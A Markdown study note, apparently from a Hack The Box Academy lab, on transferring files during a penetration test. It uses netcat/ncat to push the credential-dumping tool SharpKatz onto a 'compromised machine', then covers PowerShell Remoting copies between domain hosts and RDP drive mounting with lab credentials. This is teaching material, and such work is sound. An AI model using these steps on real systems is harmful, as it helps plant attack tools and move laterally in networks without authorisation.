---
title: File Transfer - More
draft: false
tags:
---
## netcat

Start a listener on the target machine:

```shell-session
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

If the compromised machine is using Ncat, we'll need to specify `--recv-only` to close the connection once the file transfer is finished:

```shell-session
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

Connect to the target machine from attacker machine and send in the file:

```shell-session
jadu101@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

When using ncat, we need to specify `--send-only`:

```shell-session
jadu101@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

## Powershell

We can use PowerShell Remoting.

But we will need an admin access and winrm access for this.

Let's say we are moving file from DC01 to DATABASE01. 

Test the WinRM connection on DATABASE01:

```powershell-session
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Create session variable to the remote target:

```powershell-session
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

Copy file we want to transfer to DATABASE01 session:

```powershell-session
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

We can also copy file from DATABASE01 to DC01:

```powershell-session
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP

We can usually copy-paste but sometimes this might not work.

We can mount folder to be safe.

Using redesktop:

```shell-session
jadu101@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

Using xfreerdp:

```shell-session
jadu101@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

